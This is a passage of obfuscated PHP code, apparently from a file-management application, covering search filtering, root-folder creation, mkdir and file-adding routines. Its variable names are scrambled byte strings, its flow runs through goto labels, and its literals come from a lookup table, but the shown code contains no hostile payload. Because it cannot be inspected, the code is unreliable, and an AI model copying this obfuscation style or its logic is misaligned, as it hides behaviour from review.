$this->_listSearchMerge($fÀË¶ÊŒ¢‹, $eŸËŸÂ¤ïÆ, $c‹êç¸¯ŸÂ, $Aõ±ğ•« ); goto bŒÑÒ›ÚÔã; bŒÑÒ›ÚÔã: } private function _listSearchDesc(&$FÉ×òªÛô‰, $E“Ü¦ö‡¸, $b„õÀ¢œ¦‡) { goto dº–„†—Ô¬; eµÜááô»: $FÄÒ‚ ¥›Š = array_unique($FÄÒ‚ ¥›Š); if (!$FÄÒ‚ ¥›Š) { return; } $F ŸøÓŸ§ = array($C‰È¢•ªâ—[404] => array($C‰È¢•ªâ—[7], $FÄÒ‚ ¥›Š), $C‰È¢•ªâ—[103] => $C‰È¢•ªâ—[440], $C‰È¢•ªâ—[381] => array($C‰È¢•ªâ—[389], $C‰È¢•ªâ—[1778] . $E“Ü¦ö‡¸[$C‰È¢•ªâ—[1776]] . $C‰È¢•ªâ—[1778])); goto A„ä²„ãĞ­; dº–„†—Ô¬: $C‰È¢•ªâ— =& $_SERVER[Ü˜]; if (!$E“Ü¦ö‡¸[$C‰È¢•ªâ—[1776]] || $FÉ×òªÛô‰[$C‰È¢•ªâ—[373]][$C‰È¢•ªâ—[360]] > 1) { return; } $FÄÒ‚ ¥›Š = $this->listSearchChildren($E“Ü¦ö‡¸[$C‰È¢•ªâ—[487]]); goto eµÜááô»; A„ä²„ãĞ­: $dòŞ›Çµàì = Model($C‰È¢•ªâ—[541])->field($C‰È¢•ªâ—[404])->where($F ŸøÓŸ§)->select(); $eÔ§±ª––å = array_to_keyvalue($dòŞ›Çµàì, $C‰È¢•ªâ—[33], $C‰È¢•ªâ—[404]); $this->_listSearchMerge($FÉ×òªÛô‰, $E“Ü¦ö‡¸, $b„õÀ¢œ¦‡, $eÔ§±ª––å); goto f«›¾¶àù‡; f«›¾¶àù‡: } private function _listSearchGroupTag(&$BˆÍóŸ¹šæ, $Bª‚ô§¥İ—, $cí¾ˆöŸ„) { goto DçôçÊÄ¹³; Bº‘è‘ä: $eÂò¹ ³à = array_to_keyvalue($eÂò¹ ³à, $C«Û›ë¹‡[33], $C«Û›ë¹‡[86]); $b»’Òè†¿ = array_unique($eÂò¹ ³à); $this->_listSearchMerge($BˆÍóŸ¹šæ, $Bª‚ô§¥İ—, $cí¾ˆöŸ„, $b»’Òè†¿); goto eæ…¡ùğª; DËÓåŠ¢é: if (!$e½µ÷ä‰È) { return; } $cîùÚŒµ«Â = array($C«Û›ë¹‡[428] => array($C«Û›ë¹‡[7], $e½µ÷ä‰È), $C«Û›ë¹‡[1529] => 0, $C«Û›ë¹‡[29] => $C«Û›ë¹‡[1800] . $Bó‚â±¥ƒ); $eÂò¹ ³à = Model($C«Û›ë¹‡[429])->field($C«Û›ë¹‡[86])->where($cîùÚŒµ«Â)->select(); goto Bº‘è‘ä; CÎš¬ÄÑœ: $e½µ÷ä‰È = array(); $A¾ÊÜœ¯ã = $Bª‚ô§¥İ—[$C«Û›ë¹‡[1776]]; foreach ($AŞ²‰šÀ†[$C«Û›ë¹‡[376]] as $cí‹ˆìˆ•) { $C‚Ú¸ë¨‹ = $cí‹ˆìˆ•[$C«Û›ë¹‡[28]]; $bÖ¾„µ‚Ê = str_replace($C«Û›ë¹‡[50], $C«Û›ë¹‡[33], Pinyin::encode($C‚Ú¸ë¨‹)); if (stripos($C‚Ú¸ë¨‹, $A¾ÊÜœ¯ã) !== !1 || stripos($bÖ¾„µ‚Ê, $A¾ÊÜœ¯ã) !== !1) { $e½µ÷ä‰È[] = $cí‹ˆìˆ•[$C«Û›ë¹‡[402]]; } } goto DËÓåŠ¢é; DçôçÊÄ¹³: $C«Û›ë¹‡ =& $_SERVER[Ü˜]; if (!$Bª‚ô§¥İ—[$C«Û›ë¹‡[1776]] || $BˆÍóŸ¹šæ[$C«Û›ë¹‡[373]][$C«Û›ë¹‡[360]] > 1 || !$Bª‚ô§¥İ—[$C«Û›ë¹‡[487]]) { return; } $eÛÅƒé‘£ = $this->sourceInfo($Bª‚ô§¥İ—[$C«Û›ë¹‡[487]]); goto B¾áÍ‘²ñ; B¾áÍ‘²ñ: if (!$eÛÅƒé‘£ || $eÛÅƒé‘£[$C«Û›ë¹‡[413]] != SourceModel::TYPE_GROUP) { return; } $Bó‚â±¥ƒ = $eÛÅƒé‘£[$C«Û›ë¹‡[493]]; $AŞ²‰šÀ† = Model($C«Û›ë¹‡[1938])->get($Bó‚â±¥ƒ); goto CÎš¬ÄÑœ; eæ…¡ùğª: } private function _listSearchMerge(&$BÙæ÷Ë‰, $c°ÎŒ¦†Óì, $BÌéÒĞ†Ø, $bÙñ›š˜) { goto a®„ÑëáàÊ; c£¶®„—÷ê: $dÅ‰ÓÅµù“ = $this->field($BÌéÒĞ†Ø)->where($FØ¡Ïì†”™)->select(); if (!$dÅ‰ÓÅµù“) { return; } $bë•·Îõ‹ = array(); goto d§òè¾ä¿“; a®„ÑëáàÊ: $bá·”¸†§ˆ =& $_SERVER[Ü˜]; if (!$bÙñ›š˜) { return; } $c›Ô†‡è… = array_to_keyvalue($BÙæ÷Ë‰[$bá·”¸†§ˆ[376]], $bá·”¸†§ˆ[33], $bá·”¸†§ˆ[404]); goto aö¬Œ¼Ò”; aö¬Œ¼Ò”: $A°ÍÖ‰Ù– = array_diff($bÙñ›š˜, $c›Ô†‡è…); if (!$A°ÍÖ‰Ù–) { return; } $FØ¡Ïì†”™ = array($bá·”¸†§ˆ[404] => array($bá·”¸†§ˆ[7], $A°ÍÖ‰Ù–)); goto c£¶®„—÷ê; d§òè¾ä¿“: foreach ($dÅ‰ÓÅµù“ as $F³é°ïª·) { if ($this->_listSearchFilter($F³é°ïª·, $c°ÎŒ¦†Óì)) { $bë•·Îõ‹[] = $F³é°ïª·; } } $BÙæ÷Ë‰[$bá·”¸†§ˆ[376]] = array_merge($bë•·Îõ‹, $BÙæ÷Ë‰[$bá·”¸†§ˆ[376]]); $BÙæ÷Ë‰[$bá·”¸†§ˆ[373]][$bá·”¸†§ˆ[374]] += count($bë•·Îõ‹); goto CèŞ ÷éè¶; CèŞ ÷éè¶: } private function _listSearchFilter($Bå¬¿Š‚¾Û, $a²š™»‚“Ú) { goto cè±´–¡êÆ; cè±´–¡êÆ: $F¢‹™ß©¡ =& $_SERVER[Ü˜]; $cŞì»´ÊÅ = $Bå¬¿Š‚¾Û[$F¢‹™ß©¡[412]] == $F¢‹™ß©¡[97]; if (!strstr($Bå¬¿Š‚¾Û[$F¢‹™ß©¡[496]], $F¢‹™ß©¡[47] . $a²š™»‚“Ú[$F¢‹™ß©¡[487]] . $F¢‹™ß©¡[47])) { return !1; } goto b ßó²–‹; D‚Åí†„ƒ˜: if (isset($a²š™»‚“Ú[$F¢‹™ß©¡[571]]) && $a²š™»‚“Ú[$F¢‹™ß©¡[571]] != $Bå¬¿Š‚¾Û[$F¢‹™ß©¡[443]]) { return !1; } return !0; goto EˆõØİ›²é; b ßó²–‹: if (isset($a²š™»‚“Ú[$F¢‹™ß©¡[414]]) && $a²š™»‚“Ú[$F¢‹™ß©¡[414]] != $F¢‹™ß©¡[1743]) { if ($a²š™»‚“Ú[$F¢‹™ß©¡[414]] == $F¢‹™ß©¡[87] && !$cŞì»´ÊÅ) { return !1; } if ($a²š™»‚“Ú[$F¢‹™ß©¡[414]] != $F¢‹™ß©¡[87] && $cŞì»´ÊÅ) { return !1; } if (!strstr($Bå¬¿Š‚¾Û[$F¢‹™ß©¡[178]], $F¢‹™ß©¡[47] . $a²š™»‚“Ú[$F¢‹™ß©¡[414]] . $F¢‹™ß©¡[47])) { return !1; } } if (isset($a²š™»‚“Ú[$F¢‹™ß©¡[1939]]) && $a²š™»‚“Ú[$F¢‹™ß©¡[1939]] < $Bå¬¿Š‚¾Û[$F¢‹™ß©¡[88]]) { return !1; } if (isset($a²š™»‚“Ú[$F¢‹™ß©¡[1940]]) && $a²š™»‚“Ú[$F¢‹™ß©¡[1940]] > $Bå¬¿Š‚¾Û[$F¢‹™ß©¡[88]]) { return !1; } goto D‚Åí†„ƒ˜; EˆõØİ›²é: } public function listSearchChildren($añİ—¬®Ñ, $AÉ¥°¨…óÙ = 5000) { goto Aî”®îÅ¡†; Dâï½œ§Œ¶: $Cá”£ª™Ÿ© = array($CÇÎÈ‹ÚÉŸ[496] => array($CÇÎÈ‹ÚÉŸ[389], $BßÛî–—š¼[$CÇÎÈ‹ÚÉŸ[496]] . $BßÛî–—š¼[$CÇÎÈ‹ÚÉŸ[404]] . $CÇÎÈ‹ÚÉŸ[522])); $fÕ©ÀõªÕÆ = $this->field($CÇÎÈ‹ÚÉŸ[404])->cache(null, 600)->where($Cá”£ª™Ÿ©)->count(); if ($fÕ©ÀõªÕÆ > $AÉ¥°¨…óÙ) { return $this->_listSearchChildrenNear($añİ—¬®Ñ, $AÉ¥°¨…óÙ); } goto F¢‚ˆáÃ‰Ô; Aî”®îÅ¡†: $CÇÎÈ‹ÚÉŸ =& $_SERVER[Ü˜]; $A‹ğÀÜÜÒ = array(); $BßÛî–—š¼ = $this->sourceInfo($añİ—¬®Ñ); goto Dâï½œ§Œ¶; F¢‚ˆáÃ‰Ô: $F‡î‹±ÃÔÛ = $this->field($CÇÎÈ‹ÚÉŸ[404])->where($Cá”£ª™Ÿ©)->select(); $A‹ğÀÜÜÒ = array_to_keyvalue($F‡î‹±ÃÔÛ, $CÇÎÈ‹ÚÉŸ[33], $CÇÎÈ‹ÚÉŸ[404]); return $A‹ğÀÜÜÒ; goto BÊ©Ã½Ïº; BÊ©Ã½Ïº: } private function _listSearchChildrenNear($d˜Î ê‘•”, $c†‚Š…òğ) { goto Dó’­‡; aÔÅ©¬ÊÛ¼: $Fäêñá”Û = $this->field($DİÌš¶ƒæ˜[1941])->where($d»…ç»óã©)->select(); $BŠó¥›«Á« = array_to_keyvalue(array_filter_by_field($Fäêñá”Û, $DİÌš¶ƒæ˜[412], $DİÌš¶ƒæ˜[97]), $DİÌš¶ƒæ˜[33], $DİÌš¶ƒæ˜[404]); $b‡“É¶ÕÄÈ = array_merge($b‡“É¶ÕÄÈ, array_to_keyvalue($Fäêñá”Û, $DİÌš¶ƒæ˜[33], $DİÌš¶ƒæ˜[404])); goto d¤öª›¯è; d¤öª›¯è: if (!$BŠó¥›«Á«) { return $b‡“É¶ÕÄÈ; } $d»…ç»óã© = array($DİÌš¶ƒæ˜[487] => array($DİÌš¶ƒæ˜[7], $BŠó¥›«Á«)); $Fäêñá”Û = $this->field($DİÌš¶ƒæ˜[1941])->where($d»…ç»óã©)->limit($c†‚Š…òğ)->select(); goto Bï­ŒÉ‘Ü; Dó’­‡: $DİÌš¶ƒæ˜ =& $_SERVER[Ü˜]; $b‡“É¶ÕÄÈ = array(); $d»…ç»óã© = array($DİÌš¶ƒæ˜[487] => $d˜Î ê‘•”); goto aÔÅ©¬ÊÛ¼; Bï­ŒÉ‘Ü: $b‡“É¶ÕÄÈ = array_merge($b‡“É¶ÕÄÈ, array_to_keyvalue($Fäêñá”Û, $DİÌš¶ƒæ˜[33], $DİÌš¶ƒæ˜[404])); $b‡“É¶ÕÄÈ = array_slice($b‡“É¶ÕÄÈ, 0, $c†‚Š…òğ); return $b‡“É¶ÕÄÈ; goto fñìåÈ²Óì; fñìåÈ²Óì: } private function _listSearchBindPinyin($c¶¤…¼Íºô, &$Fœ–œÙ†‚ß, &$E‡”ÅØ™Ğ) { goto E÷­­ÓÁ¢ß; E÷­­ÓÁ¢ß: $Fõ–‘ïËÏÄ =& $_SERVER[Ü˜]; if (!isset($c¶¤…¼Íºô[$Fõ–‘ïËÏÄ[1776]]) || !$c¶¤…¼Íºô[$Fõ–‘ïËÏÄ[1776]]) { return; } if (!Input::check($c¶¤…¼Íºô[$Fõ–‘ïËÏÄ[1776]], $Fõ–‘ïËÏÄ[325]) || strlen($c¶¤…¼Íºô[$Fõ–‘ïËÏÄ[1776]]) < 2) { return; } goto e¡•Ğ„½ö©; BƒŞ°øåŞğ: $E‡”ÅØ™Ğ = $Fõ–‘ïËÏÄ[1943] . str_replace($Fõ–‘ïËÏÄ[47], $Fõ–‘ïËÏÄ[1944], $E‡”ÅØ™Ğ); $c÷‘ã³®çÙ = $Fœ–œÙ†‚ß[$Fõ–‘ïËÏÄ[28]]; unset($Fœ–œÙ†‚ß[$Fõ–‘ïËÏÄ[28]]); goto Bô§ŠÚÙ¨µ; Bô§ŠÚÙ¨µ: foreach ($Fœ–œÙ†‚ß as $BôÚÎ§ê¹ => $b¡…ÊÁ…®) { $eóŒÂäÑÓµ[$Fõ–‘ïËÏÄ[1943] . $BôÚÎ§ê¹] = $b¡…ÊÁ…®; } foreach ($c÷‘ã³®çÙ as $f±‡ç¶À) { $eóŒÂäÑÓµ[] = array($Fõ–‘ïËÏÄ[1945] => $f±‡ç¶À, $Fõ–‘ïËÏÄ[958] => $Fõ–‘ïËÏÄ[1780], array($Fõ–‘ïËÏÄ[1946] => $f±‡ç¶À, $Fõ–‘ïËÏÄ[1947] => array($Fõ–‘ïËÏÄ[7], array($Fõ–‘ïËÏÄ[453], $Fõ–‘ïËÏÄ[452])))); } $this->join($C·«’ïŸÒ²); goto a¸ó´ÍÕó; e¡•Ğ„½ö©: $C·«’ïŸÒ² = "\x4c\x45\x46\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x69\157\137\163\x6f\165\162\x63\x65\x5f\155\x65\164\141\40\x6d\x65\164\141\40\157\x6e\x20\x73\157\x75\162\143\145\x2e\163\157\165\x72\x63\145\111\x44\40\x3d\40\x6d\x65\164\x61\56\x73\x6f\x75\x72\143\x65\x49\x44"; $eóŒÂäÑÓµ = array(); $E‡”ÅØ™Ğ = str_replace(array($Fõ–‘ïËÏÄ[63], $Fõ–‘ïËÏÄ[50], $Fõ–‘ïËÏÄ[1942]), $Fõ–‘ïËÏÄ[33], $E‡”ÅØ™Ğ); goto BƒŞ°øåŞğ; a¸ó´ÍÕó: $Fœ–œÙ†‚ß = $eóŒÂäÑÓµ; goto dßùôèéøõ; dßùôèéøõ: } private function _parseSearchWhere($a‡Ÿ¡¨àº) { goto AÑÙÎÜËµ½; AÑÙÎÜËµ½: $aé«„¡½ ¿ =& $_SERVER[Ü˜]; $a§Ëø¾£À  = array(); if (isset($a‡Ÿ¡¨àº[$aé«„¡½ ¿[730]]) && $a‡Ÿ¡¨àº[$aé«„¡½ ¿[730]]) { $a§Ëø¾£À [$aé«„¡½ ¿[94]] = array($aé«„¡½ ¿[1948], $a‡Ÿ¡¨àº[$aé«„¡½ ¿[730]]); } goto cëì¼³ÃÓ†; eç¦“â£ñ: if (isset($a‡Ÿ¡¨àº[$aé«„¡½ ¿[1776]]) && trim($a‡Ÿ¡¨àº[$aé«„¡½ ¿[1776]])) { $aµˆå‹Ş³× = trim($a‡Ÿ¡¨àº[$aé«„¡½ ¿[1776]]); $f¯—æÆ‘ = explode($aé«„¡½ ¿[50], $aµˆå‹Ş³×); if (strlen($aµˆå‹Ş³×) > 2 && (substr($aµˆå‹Ş³×, 0, 1) == $aé«„¡½ ¿[126] && substr($aµˆå‹Ş³×, -1) == $aé«„¡½ ¿[126]) || substr($aµˆå‹Ş³×, 0, 1) == $aé«„¡½ ¿[55] && substr($aµˆå‹Ş³×, -1) == $aé«„¡½ ¿[55]) { $aµˆå‹Ş³× = substr($aµˆå‹Ş³×, 1, -1); $f¯—æÆ‘ = array($aµˆå‹Ş³×); } $a§Ëø¾£À [$aé«„¡½ ¿[28]] = array(array($aé«„¡½ ¿[521], $aé«„¡½ ¿[1778] . $aµˆå‹Ş³× . $aé«„¡½ ¿[1778])); if (count($f¯—æÆ‘) > 1) { $a§Ëø¾£À [$aé«„¡½ ¿[28]] = array(); foreach ($f¯—æÆ‘ as $bˆ³ÓŠô¯·) { if (!trim($bˆ³ÓŠô¯·)) { continue; } $a§Ëø¾£À [$aé«„¡½ ¿[28]][] = array($aé«„¡½ ¿[521], $aé«„¡½ ¿[1778] . trim($bˆ³ÓŠô¯·) . $aé«„¡½ ¿[1778]); } } } return $a§Ëø¾£À ; goto AéŒóšèñÕ; d´ó¥‚ÚÊç: if (isset($a‡Ÿ¡¨àº[$aé«„¡½ ¿[571]]) && $a‡Ÿ¡¨àº[$aé«„¡½ ¿[571]]) { $a§Ëø¾£À [] = array($aé«„¡½ ¿[443] => $a‡Ÿ¡¨àº[$aé«„¡½ ¿[571]], $aé«„¡½ ¿[441] => $a‡Ÿ¡¨àº[$aé«„¡½ ¿[571]], $aé«„¡½ ¿[958] => $aé«„¡½ ¿[1780]); } if (isset($a‡Ÿ¡¨àº[$aé«„¡½ ¿[414]]) && $a‡Ÿ¡¨àº[$aé«„¡½ ¿[414]]) { $Aêˆ•µªğÅ = $a‡Ÿ¡¨àº[$aé«„¡½ ¿[414]]; if ($Aêˆ•µªğÅ == $aé«„¡½ ¿[87]) { $a§Ëø¾£À [$aé«„¡½ ¿[412]] = 1; } else { if ($Aêˆ•µªğÅ == $aé«„¡½ ¿[1951]) { $a§Ëø¾£À [$aé«„¡½ ¿[412]] = 0; } else { if ($Aêˆ•µªğÅ) { $Aêˆ•µªğÅ = is_array($Aêˆ•µªğÅ) ? $Aêˆ•µªğÅ : explode($aé«„¡½ ¿[47], $Aêˆ•µªğÅ); $a§Ëø¾£À [$aé«„¡½ ¿[414]] = array($aé«„¡½ ¿[420], $Aêˆ•µªğÅ); $a§Ëø¾£À [$aé«„¡½ ¿[412]] = 0; } } } } if (isset($a‡Ÿ¡¨àº[$aé«„¡½ ¿[487]]) && $a‡Ÿ¡¨àº[$aé«„¡½ ¿[487]]) { $d¬µè–•Ì¾ = $this->sourceInfo($a‡Ÿ¡¨àº[$aé«„¡½ ¿[487]]); $a§Ëø¾£À [$aé«„¡½ ¿[562]] = array($aé«„¡½ ¿[521], $d¬µè–•Ì¾[$aé«„¡½ ¿[496]] . $a‡Ÿ¡¨àº[$aé«„¡½ ¿[487]] . $aé«„¡½ ¿[522]); } goto eç¦“â£ñ; cëì¼³ÃÓ†: if (isset($a‡Ÿ¡¨àº[$aé«„¡½ ¿[485]]) && $a‡Ÿ¡¨àº[$aé«„¡½ ¿[485]]) { $Có°ïÛ³‹ = array($aé«„¡½ ¿[1949], $a‡Ÿ¡¨àº[$aé«„¡½ ¿[485]]); if ($a§Ëø¾£À [$aé«„¡½ ¿[94]]) { $a§Ëø¾£À [$aé«„¡½ ¿[94]] = array($a§Ëø¾£À [$aé«„¡½ ¿[94]], $Có°ïÛ³‹, $aé«„¡½ ¿[1950]); } else { $a§Ëø¾£À [$aé«„¡½ ¿[94]] = $Có°ïÛ³‹; } } if (isset($a‡Ÿ¡¨àº[$aé«„¡½ ¿[1939]]) && $a‡Ÿ¡¨àº[$aé«„¡½ ¿[1939]] > 0) { $a§Ëø¾£À [$aé«„¡½ ¿[88]] = array($aé«„¡½ ¿[1948], $a‡Ÿ¡¨àº[$aé«„¡½ ¿[1939]]); } if (isset($a‡Ÿ¡¨àº[$aé«„¡½ ¿[1940]]) && $a‡Ÿ¡¨àº[$aé«„¡½ ¿[1940]]) { $Có°ïÛ³‹ = array($aé«„¡½ ¿[1949], $a‡Ÿ¡¨àº[$aé«„¡½ ¿[1940]]); if ($a§Ëø¾£À [$aé«„¡½ ¿[88]]) { $a§Ëø¾£À [$aé«„¡½ ¿[88]] = array($a§Ëø¾£À [$aé«„¡½ ¿[88]], $Có°ïÛ³‹, $aé«„¡½ ¿[1950]); } else { $a§Ëø¾£À [$aé«„¡½ ¿[88]] = $Có°ïÛ³‹; } } goto d´ó¥‚ÚÊç; AéŒóšèñÕ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($e‰ˆ¼Ö“ˆÍ) { $a‘½•½¤æÓ =& $_SERVER[Ü˜]; $B£¸®ï¯£‹ = Model($a‘½•½¤æÓ[511])->where(array($a‘½•½¤æÓ[1521] => $e‰ˆ¼Ö“ˆÍ))->find(); $DèÁ›ˆ = $this->_mkdirRoot(SourceModel::TYPE_USER, $e‰ˆ¼Ö“ˆÍ, $B£¸®ï¯£‹[$a‘½•½¤æÓ[28]]); $this->userDesktopAdd($DèÁ›ˆ); return $DèÁ›ˆ; } public function userDesktopAdd($cõŠ‘à½Ï¯) { $C·èî”ÛÏ¨ =& $_SERVER[Ü˜]; $AÄ´ —õó = LNG($C·èî”ÛÏ¨[1952]); $CªàåµƒîŠ = $this->mkdir($cõŠ‘à½Ï¯, $AÄ´ —õó); $this->metaSet($CªàåµƒîŠ, $C·èî”ÛÏ¨[1953], $C·èî”ÛÏ¨[97]); $this->metaSet($cõŠ‘à½Ï¯, $C·èî”ÛÏ¨[1954], $CªàåµƒîŠ); } public function groupRootAdd($f¾‰É›°) { $CŸ¼–öÎ =& $_SERVER[Ü˜]; $då†ã©•ªÕ = Model($CŸ¼–öÎ[495])->where(array($CŸ¼–öÎ[1771] => $f¾‰É›°))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $f¾‰É›°, $då†ã©•ªÕ[$CŸ¼–öÎ[28]]); } public function systemRootPathAdd($fÓÉ‡‚Ï§) { if ($fÓÉ‡‚Ï§ != $_SERVER[Ü˜][514]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $fÓÉ‡‚Ï§); } public function userRootRemove($Fà±¾³Şİâ) { $B®¬š³´… = $this->sourceRoot(SourceModel::TYPE_USER, $Fà±¾³Şİâ); if (!$B®¬š³´…) { return; } $this->remove($B®¬š³´…, !1); } public function groupRootRemove($a°ğƒ¤¡‰) { $AÓ‡è†×À = $this->sourceRoot(SourceModel::TYPE_GROUP, $a°ğƒ¤¡‰); if (!$AÓ‡è†×À) { return; } $this->remove($AÓ‡è†×À, !1); } private function _mkdirRoot($cô¸«ĞŞÚÜ, $eïš£×…®±, $cÂ‹Èè‘Ÿ‚) { goto e‰«â†¦ã; CŠÍéÙó’Ö: CacheLock::unlock($CÑ™ºÄƒÑ”); return $D½Ö°¹²ƒ; goto Bˆ¯Ğ‚‰İè; C¶Êäœš‹: $CÑ™ºÄƒÑ” = "\115\157\x64\145\x6c\x53\157\x75\x72\143\145\56\x6d\153\144\151\x72\x52\157\157\164\x2e{$cô¸«ĞŞÚÜ}\56{$eïš£×…®±}\56" . $cÂ‹Èè‘Ÿ‚; CacheLock::lock($CÑ™ºÄƒÑ”); $còœ¿ğŠÀ[$BÂ¤‚Ø¦Ä[28]] = $cÂ‹Èè‘Ÿ‚; goto aÊ »’âÖ°; e‰«â†¦ã: $BÂ¤‚Ø¦Ä =& $_SERVER[Ü˜]; $còœ¿ğŠÀ = array($BÂ¤‚Ø¦Ä[403] => 0, $BÂ¤‚Ø¦Ä[558] => $cô¸«ĞŞÚÜ, $BÂ¤‚Ø¦Ä[559] => $eïš£×…®±, $BÂ¤‚Ø¦Ä[555] => 1, $BÂ¤‚Ø¦Ä[560] => USER_ID, $BÂ¤‚Ø¦Ä[561] => USER_ID, $BÂ¤‚Ø¦Ä[556] => $BÂ¤‚Ø¦Ä[33], $BÂ¤‚Ø¦Ä[562] => $BÂ¤‚Ø¦Ä[507], $BÂ¤‚Ø¦Ä[431] => 0, $BÂ¤‚Ø¦Ä[557] => 0, $BÂ¤‚Ø¦Ä[457] => 0, $BÂ¤‚Ø¦Ä[563] => $BÂ¤‚Ø¦Ä[33]); if ($AØòöÂÇšï = $this->where($còœ¿ğŠÀ)->find()) { return $AØòöÂÇšï[$BÂ¤‚Ø¦Ä[404]]; } goto C¶Êäœš‹; aÊ »’âÖ°: $D½Ö°¹²ƒ = $this->add($còœ¿ğŠÀ); $f‘í‚”Œå = array($BÂ¤‚Ø¦Ä[564] => short_id($D½Ö°¹²ƒ)); $this->where(array($BÂ¤‚Ø¦Ä[419] => $D½Ö°¹²ƒ))->save($f‘í‚”Œå); goto CŠÍéÙó’Ö; Bˆ¯Ğ‚‰İè: } private function sourceRoot($cµË‰­×Òâ, $b¤Çò‘ï, $cª‘Œ¤î÷ = false) { $a±ÖõÑ•®ñ =& $_SERVER[Ü˜]; $D¾øº¥Üì = array($a±ÖõÑ•®ñ[403] => 0, $a±ÖõÑ•®ñ[558] => $cµË‰­×Òâ, $a±ÖõÑ•®ñ[559] => $b¤Çò‘ï); if ($E¬¯ÙÎ·ğí = $this->where($D¾øº¥Üì)->find()) { return $cª‘Œ¤î÷ ? $E¬¯ÙÎ·ğí : $E¬¯ÙÎ·ğí[$a±ÖõÑ•®ñ[404]]; } return !1; } public function sourceRootGroup($cç¥‚’œÍè) { goto Aªñ¾á«ùæ; bÃ¾ˆ‰ÍÏ: $this->selectPageReset(); $f¬ª¯ŸïêŠ = $this->listSource($AŞ­ç§Š¯Õ, 1000); $this->selectPageRestore(); goto E¯Ûßî˜¯Ó; Aªñ¾á«ùæ: $d²ãâ¡Î‘Ğ =& $_SERVER[Ü˜]; if (is_string($cç¥‚’œÍè)) { $cç¥‚’œÍè = array($cç¥‚’œÍè); } $AŞ­ç§Š¯Õ = array($d²ãâ¡Î‘Ğ[403] => 0, $d²ãâ¡Î‘Ğ[558] => SourceModel::TYPE_GROUP, $d²ãâ¡Î‘Ğ[559] => array($d²ãâ¡Î‘Ğ[7], $cç¥‚’œÍè)); goto bÃ¾ˆ‰ÍÏ; E¯Ûßî˜¯Ó: return array_to_keyvalue($f¬ª¯ŸïêŠ[$d²ãâ¡Î‘Ğ[85]], $d²ãâ¡Î‘Ğ[493]); goto dŠà‡Ø’÷Û; dŠà‡Ø’÷Û: } public function mkfile($c¹ÒÖ´İ, $B‚ãÀŞ, $c«»£øó‚ö = '', $Bö¡ï„Ç‰Ÿ = REPEAT_RENAME) { $F¶˜ÀµÃ«Ş =& $_SERVER[Ü˜]; $dÁ¡ÙŞ¡ = Model($F¶˜ÀµÃ«Ş[580])->addFileByContent($c«»£øó‚ö, $B‚ãÀŞ); return $this->_createFileCall($c¹ÒÖ´İ, $B‚ãÀŞ, $dÁ¡ÙŞ¡, $Bö¡ï„Ç‰Ÿ, $F¶˜ÀµÃ«Ş[1217]); } public function addFile($CÀÁÜİÍ, $aëŠæ÷‘¹–, $A¼áÆºùº», $f“ŠÁÄŸ«É = false, $bœ À•Õù— = REPEAT_RENAME) { $FùÀèŞ‚êò = Model($_SERVER[Ü˜][580])->addFile($aëŠæ÷‘¹–, $A¼áÆºùº», $f“ŠÁÄŸ«É); return $this->_createFileCall($CÀÁÜİÍ, $A¼áÆºùº», $FùÀèŞ‚êò, $bœ À•Õù—); } public function addFileByFileID($Bî˜×ˆˆ…, $dÔù¤ÌöçŠ, $Aà¡¶È¦çª, $E¸µ‹½…æÎ = REPEAT_RENAME) { $Eä²‡¥Ô‰ =& $_SERVER[Ü˜]; $F®¼òøÄÈ = Model($Eä²‡¥Ô‰[580])->find($dÔù¤ÌöçŠ); Model($Eä²‡¥Ô‰[580])->linkAdd($dÔù¤ÌöçŠ); return $this->_createFileCall($Bî˜×ˆˆ…, $Aà¡¶È¦çª, $F®¼òøÄÈ, $E¸µ‹½…æÎ); } public function addFileByRemote($c„‚¾¸¼Â, $C§œÜËÙ­, $bÍ÷Ï«×®, $FÚÅ·ñ…êä = array(), $cñ‹ÉÅâå„ = REPEAT_RENAME) { $D…äö¾Ï¦  = Model($_SERVER[Ü˜][580])->addFileByRemote($C§œÜËÙ­, $bÍ÷Ï«×®, $FÚÅ·ñ…êä); return $this->_createFileCall($c„‚¾¸¼Â, $bÍ÷Ï«×®, $D…äö¾Ï¦ , $cñ‹ÉÅâå„); } private function _createFileCall($F¦»Àé•ì, $eÄ²î²’„, $C¬ÀÓóˆÉŒ, $F¨ó—á, $cëíšİŸ = "\x75\x70\x6c\x6f\x61\144") { goto aª•¹İ¡í†; bªƒ·Ì¨õº: $eÁ¿†ï–îâ = $this->fileNameExist($F¦»Àé•ì, $eÄ²î²’„); $aÌ””ÑÍßˆ = $this->_createFile($F¦»Àé•ì, $eÄ²î²’„, $C¬ÀÓóˆÉŒ, $F¨ó—á, $C‡Ñ®¥°‹«); if (!$C‡Ñ®¥°‹«) { Model($d…ÈºËï¦[459])->remove($C¬ÀÓóˆÉŒ[$d…ÈºËï¦[456]]); } goto b¸‹Èœ×; b¸‹Èœ×: if ($C‡Ñ®¥°‹« && $aÌ””ÑÍßˆ && $aÌ””ÑÍßˆ != $eÁ¿†ï–îâ) { Model($d…ÈºËï¦[1923])->eventCreate($aÌ””ÑÍßˆ, $cëíšİŸ); } $this->lockWriteEnd($F¦»Àé•ì, $eÄ²î²’„); return $aÌ””ÑÍßˆ; goto a‰ì°ˆğÉ; aª•¹İ¡í†: $d…ÈºËï¦ =& $_SERVER[Ü˜]; $C‡Ñ®¥°‹« = !1; $this->lockWriteStart($F¦»Àé•ì, $eÄ²î²’„); goto bªƒ·Ì¨õº; a‰ì°ˆğÉ: } public function mkdir($d¾Ü…ô›Î, $bÃÌÖù…», $cÆö²×Œ—õ = REPEAT_SKIP) { goto DĞòÙß øò; BîßÉœ°: return $CÉèÈ·Æ¸; goto a÷˜½„ ¬; DĞòÙß øò: $d¶¼‰µó¼ =& $_SERVER[Ü˜]; $E¯Şµ£ÇÍ = $this->sourceInfo($d¾Ü…ô›Î); if (!$E¯Şµ£ÇÍ) { return !1; } goto d¿ßù©˜Ş–; BªÔÜ™›±‡: $CÉèÈ·Æ¸ = $this->_addSoure($aóóˆ†ã—, $E¯Şµ£ÇÍ); Model($d¶¼‰µó¼[1923])->eventCreate($CÉèÈ·Æ¸, $d¶¼‰µó¼[1218]); $this->lockWriteEnd($d¾Ü…ô›Î, $bÃÌÖù…»); goto BîßÉœ°; d¿ßù©˜Ş–: $this->lockWriteStart($d¾Ü…ô›Î, $bÃÌÖù…»); if ($cÆö²×Œ—õ !== !1) { $b‰§áœãÁ = 